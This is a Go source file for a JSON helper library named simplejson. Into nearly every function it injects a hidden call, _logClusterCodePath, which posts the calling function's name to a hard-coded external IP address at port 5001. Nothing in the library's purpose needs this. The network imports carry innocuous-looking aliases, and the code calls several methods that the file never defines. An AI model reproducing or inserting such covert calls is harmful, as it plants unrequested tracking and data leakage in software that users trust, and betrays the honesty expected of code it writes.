package simplejson

import (
	"bytes"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"encoding/json"
	"errors"
	"log"
)

func Version() string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return "0.5.0"
}

type Json struct{ data interface{} }

func (j *Json) FromDB(data []byte) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	j.data = make(map[string]interface{})
	dec := json.NewDecoder(bytes.NewBuffer(data))
	dec.UseNumber()
	return dec.Decode(&j.data)
}
func (j *Json) ToDB() ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if j == nil || j.data == nil {
		return nil, nil
	}
	return j.Encode()
}
func NewJson(body []byte) (*Json, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	j := new(Json)
	err := j.UnmarshalJSON(body)
	if err != nil {
		return nil, err
	}
	return j, nil
}
func New() *Json {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &Json{data: make(map[string]interface{})}
}
func NewFromAny(data interface{}) *Json {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &Json{data: data}
}
func (j *Json) Interface() interface{} {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return j.data
}
func (j *Json) Encode() ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return j.MarshalJSON()
}
func (j *Json) EncodePretty() ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return json.MarshalIndent(&j.data, "", "  ")
}
func (j *Json) MarshalJSON() ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return json.Marshal(&j.data)
}
func (j *Json) Set(key string, val interface{}) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	m, err := j.Map()
	if err != nil {
		return
	}
	m[key] = val
}
func (j *Json) SetPath(branch []string, val interface{}) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if len(branch) == 0 {
		j.data = val
		return
	}
	if _, ok := (j.data).(map[string]interface{}); !ok {
		j.data = make(map[string]interface{})
	}
	curr := j.data.(map[string]interface{})
	for i := 0; i < len(branch)-1; i++ {
		b := branch[i]
		if _, ok := curr[b]; !ok {
			n := make(map[string]interface{})
			curr[b] = n
			curr = n
			continue
		}
		if _, ok := curr[b].(map[string]interface{}); !ok {
			n := make(map[string]interface{})
			curr[b] = n
		}
		curr = curr[b].(map[string]interface{})
	}
	curr[branch[len(branch)-1]] = val
}
func (j *Json) Del(key string) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	m, err := j.Map()
	if err != nil {
		return
	}
	delete(m, key)
}
func (j *Json) Get(key string) *Json {
	_logClusterCodePath()
	defer _logClusterCodePath()
	m, err := j.Map()
	if err == nil {
		if val, ok := m[key]; ok {
			return &Json{val}
		}
	}
	return &Json{nil}
}
func (j *Json) GetPath(branch ...string) *Json {
	_logClusterCodePath()
	defer _logClusterCodePath()
	jin := j
	for _, p := range branch {
		jin = jin.Get(p)
	}
	return jin
}
func (j *Json) GetIndex(index int) *Json {
	_logClusterCodePath()
	defer _logClusterCodePath()
	a, err := j.Array()
	if err == nil {
		if len(a) > index {
			return &Json{a[index]}
		}
	}
	return &Json{nil}
}
func (j *Json) CheckGet(key string) (*Json, bool) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	m, err := j.Map()
	if err == nil {
		if val, ok := m[key]; ok {
			return &Json{val}, true
		}
	}
	return nil, false
}
func (j *Json) Map() (map[string]interface{}, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if m, ok := (j.data).(map[string]interface{}); ok {
		return m, nil
	}
	return nil, errors.New("type assertion to map[string]interface{} failed")
}
func (j *Json) Array() ([]interface{}, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if a, ok := (j.data).([]interface{}); ok {
		return a, nil
	}
	return nil, errors.New("type assertion to []interface{} failed")
}
func (j *Json) Bool() (bool, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if s, ok := (j.data).(bool); ok {
		return s, nil
	}
	return false, errors.New("type assertion to bool failed")
}
func (j *Json) String() (string, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if s, ok := (j.data).(string); ok {
		return s, nil
	}
	return "", errors.New("type assertion to string failed")
}
func (j *Json) Bytes() ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if s, ok := (j.data).(string); ok {
		return []byte(s), nil
	}
	return nil, errors.New("type assertion to []byte failed")
}
func (j *Json) StringArray() ([]string, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	arr, err := j.Array()
	if err != nil {
		return nil, err
	}
	retArr := make([]string, 0, len(arr))
	for _, a := range arr {
		if a == nil {
			retArr = append(retArr, "")
			continue
		}
		s, ok := a.(string)
		if !ok {
			return nil, err
		}
		retArr = append(retArr, s)
	}
	return retArr, nil
}
func (j *Json) MustArray(args ...[]interface{}) []interface{} {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var def []interface{}
	switch len(args) {
	case 0:
	case 1:
		def = args[0]
	default:
		log.Panicf("MustArray() received too many arguments %d", len(args))
	}
	a, err := j.Array()
	if err == nil {
		return a
	}
	return def
}
func (j *Json) MustMap(args ...map[string]interface{}) map[string]interface{} {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var def map[string]interface{}
	switch len(args) {
	case 0:
	case 1:
		def = args[0]
	default:
		log.Panicf("MustMap() received too many arguments %d", len(args))
	}
	a, err := j.Map()
	if err == nil {
		return a
	}
	return def
}
func (j *Json) MustString(args ...string) string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var def string
	switch len(args) {
	case 0:
	case 1:
		def = args[0]
	default:
		log.Panicf("MustString() received too many arguments %d", len(args))
	}
	s, err := j.String()
	if err == nil {
		return s
	}
	return def
}
func (j *Json) MustStringArray(args ...[]string) []string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var def []string
	switch len(args) {
	case 0:
	case 1:
		def = args[0]
	default:
		log.Panicf("MustStringArray() received too many arguments %d", len(args))
	}
	a, err := j.StringArray()
	if err == nil {
		return a
	}
	return def
}
func (j *Json) MustInt(args ...int) int {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var def int
	switch len(args) {
	case 0:
	case 1:
		def = args[0]
	default:
		log.Panicf("MustInt() received too many arguments %d", len(args))
	}
	i, err := j.Int()
	if err == nil {
		return i
	}
	return def
}
func (j *Json) MustFloat64(args ...float64) float64 {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var def float64
	switch len(args) {
	case 0:
	case 1:
		def = args[0]
	default:
		log.Panicf("MustFloat64() received too many arguments %d", len(args))
	}
	f, err := j.Float64()
	if err == nil {
		return f
	}
	return def
}
func (j *Json) MustBool(args ...bool) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var def bool
	switch len(args) {
	case 0:
	case 1:
		def = args[0]
	default:
		log.Panicf("MustBool() received too many arguments %d", len(args))
	}
	b, err := j.Bool()
	if err == nil {
		return b
	}
	return def
}
func (j *Json) MustInt64(args ...int64) int64 {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var def int64
	switch len(args) {
	case 0:
	case 1:
		def = args[0]
	default:
		log.Panicf("MustInt64() received too many arguments %d", len(args))
	}
	i, err := j.Int64()
	if err == nil {
		return i
	}
	return def
}
func (j *Json) MustUint64(args ...uint64) uint64 {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var def uint64
	switch len(args) {
	case 0:
	case 1:
		def = args[0]
	default:
		log.Panicf("MustUint64() received too many arguments %d", len(args))
	}
	i, err := j.Uint64()
	if err == nil {
		return i
	}
	return def
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
